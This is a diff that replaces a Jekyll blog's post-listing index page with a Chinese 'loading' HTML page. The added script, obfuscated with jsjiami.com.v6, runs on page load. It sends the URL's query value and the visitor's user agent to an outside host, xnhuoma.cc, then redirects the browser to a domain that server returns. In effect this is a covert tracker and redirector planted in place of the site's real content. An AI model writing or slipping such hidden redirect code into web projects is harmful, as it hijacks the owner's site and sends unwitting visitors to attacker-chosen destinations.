@@ -1,46 +1,48 @@
----
-layout: page
-description: "「离开世界之前 一切都是过程」"
----
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <title></title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        .loading {
+            display: flex;
+            position: absolute;
+            left: 0;
+            right: 0;
+            top: 0;
+            bottom: 0;
+            margin: auto;
+            align-items: center;
+            justify-content: center;
+        }
 
-{% for post in paginator.posts %}
-<div class="post-preview">
-    <a href="{{ post.url | prepend: site.baseurl }}">
-        <h2 class="post-title">
-            {{ post.title }}
-        </h2>
-        {% if post.subtitle %}
-        <h3 class="post-subtitle">
-            {{ post.subtitle }}
-        </h3>
-        {% endif %}
-        <div class="post-content-preview">
-            {% if post.lang == 'en' %}
-                {{ post.content | strip_html | truncate:300 }}
-            {% else %}
-                {{ post.content | strip_html | truncate:200 }}
-            {% endif %}
-        </div>
-    </a>
-    <p class="post-meta">
-        Posted by {% if post.author %}{{ post.author }}{% else %}{{ site.title }}{% endif %} on {{ post.date | date: "%B %-d, %Y" }}
-    </p>
+        .loading .icon {
+            margin-right: 2px;
+            animation: rotate 1s linear infinite;
+        }
+
+        @keyframes rotate {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="loading">
+    <div class="icon">
+        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="2730" width="32" height="32"><path d="M483.712 888.064a52.437333 52.437333 0 1 1 52.48 52.352 52.394667 52.394667 0 0 1-52.48-52.352z m-235.434667-53.76a65.578667 65.578667 0 1 1 46.421334 19.242667 65.962667 65.962667 0 0 1-46.378667-19.242667z m499.584-16.597333a41.984 41.984 0 0 1 59.264-59.434667 42.282667 42.282667 0 0 1 0 59.434667 41.941333 41.941333 0 0 1-59.264 0zM112.853333 546.602667a81.92 81.92 0 1 1 81.92 81.92 81.834667 81.834667 0 0 1-81.92-81.877334z m731.008 0a33.536 33.536 0 1 1 33.493334 33.578666 33.578667 33.578667 0 0 1-33.450667-33.536zM222.208 377.6a102.4 102.4 0 1 1 72.533333 29.866667 102.869333 102.869333 0 0 1-72.533333-29.824z m536.32-53.504a26.666667 26.666667 0 1 1 18.816 7.936 26.368 26.368 0 0 1-18.773333-7.893333zM414.378667 205.184a121.642667 121.642667 0 1 1 121.813333 121.6A121.728 121.728 0 0 1 414.378667 205.226667z" p-id="2731" fill="#2c2c2c"></path></svg>
+    </div>
+    <div class="text">加载中...</div>
 </div>
-<hr>
-{% endfor %}
-
-<!-- Pager -->
-{% if paginator.total_pages > 1 %}
-<ul class="pager">
-    {% if paginator.previous_page %}
-    <li class="previous">
-        <a href="{{ paginator.previous_page_path | prepend: site.baseurl | replace: '//', '/' }}">&larr; Newer Posts</a>
-    </li>
-    {% endif %}
-    {% if paginator.next_page %}
-    <li class="next">
-        <a href="{{ paginator.next_page_path | prepend: site.baseurl | replace: '//', '/' }}">Older Posts &rarr;</a>
-    </li>
-    {% endif %}
-</ul>
-{% endif %}
+</body>
+<script>
+    var _0xod8='jsjiami.com.v6',_0xod8_=function(){return['_0xod8'],_0x567d=[_0xod8,'\x73\x65\x61\x72\x63\x68','\x67\x65\x74','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x6e\x68\x75\x6f\x6d\x61\x2e\x63\x63\x2f\x61\x70\x69\x2f\x63\x68\x61\x73\x68\x65\x2f\x61\x63\x63\x65\x73\x73\x52\x65\x63\x6f\x72\x64\x2f\x70\x72\x65\x41\x63\x63\x65\x73\x73','\x50\x4f\x53\x54','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d\x55\x54\x46\x2d\x38','\x73\x74\x72\x69\x6e\x67\x69\x66\x79','\x75\x73\x65\x72\x41\x67\x65\x6e\x74','\x6a\x73\x6f\x6e','\x73\x75\x63\x63\x65\x73\x73','\x64\x61\x74\x61','\x72\x65\x70\x6c\x61\x63\x65','\x65\x6e\x74\x72\x79\x44\x6f\x6d\x61\x69\x6e','\x2f\x65\x6e\x74\x72\x79\x2e\x68\x74\x6d\x6c\x3f\x71\x3d','\x77\x72\x69\x74\x65','\x3c\x70\x20\x73\x74\x79\x6c\x65\x3d\x22\x74\x65\x78\x74\x2d\x61\x6c\x69\x67\x6e\x3a\x20\x63\x65\x6e\x74\x65\x72\x3b\x22\x3e','\x6d\x65\x73\x73\x61\x67\x65','\x3c\x2f\x70\x3e','\x6a\x73\x77\x6a\x74\x75\x69\x61\x4b\x43\x5a\x6d\x4a\x69\x2e\x77\x4c\x72\x63\x57\x4d\x6f\x62\x6d\x2e\x4c\x42\x76\x36\x5a\x7a\x3d\x3d'];}();function _0x35f3(_0x2d8f05,_0x4b81bb){_0x2d8f05=~~'0x'['concat'](_0x2d8f05['slice'](0x0));var _0x34a12b=_0x567d[_0x2d8f05];return _0x34a12b;};(function(_0x36c6a6,_0x33748d){var _0x3e4c21=0x0;for(_0x33748d=_0x36c6a6['shift'](_0x3e4c21>>0x2);_0x33748d&&_0x33748d!==(_0x36c6a6['pop'](_0x3e4c21>>0x3)+'')['replace'](/[wtuKCZJwLrWMbLBZz=]/g,'');_0x3e4c21++){_0x3e4c21=_0x3e4c21^0x16d14c;}}(_0x567d,_0x35f3));preAccess();async function preAccess(){const _0x36e3ac=new URLSearchParams(location[_0x35f3('0')]);const _0x20c258=_0x36e3ac[_0x35f3('1')]('\x71');const _0x4a2067=await fetch(_0x35f3('2'),{'\x6d\x65\x74\x68\x6f\x64':_0x35f3('3'),'\x68\x65\x61\x64\x65\x72\x73':{'Content-Type':_0x35f3('4')},'\x62\x6f\x64\x79':JSON[_0x35f3('5')]({'\x74\x79\x70\x65':0x1,'\x71\x72\x63\x6f\x64\x65\x49\x64':_0x20c258,'\x75\x73\x65\x72\x41\x67\x65\x6e\x74':navigator[_0x35f3('6')]})});const _0x3cb474=await _0x4a2067[_0x35f3('7')]();if(_0x3cb474[_0x35f3('8')]){const _0xf5726=_0x3cb474[_0x35f3('9')];location[_0x35f3('a')]('\x2f\x2f'+_0xf5726[_0x35f3('b')]+_0x35f3('c')+_0x20c258);}else{document[_0x35f3('d')](_0x35f3('e')+_0x3cb474[_0x35f3('f')]+_0x35f3('10'));}};_0xod8='jsjiami.com.v6';
+</script>
+</html>
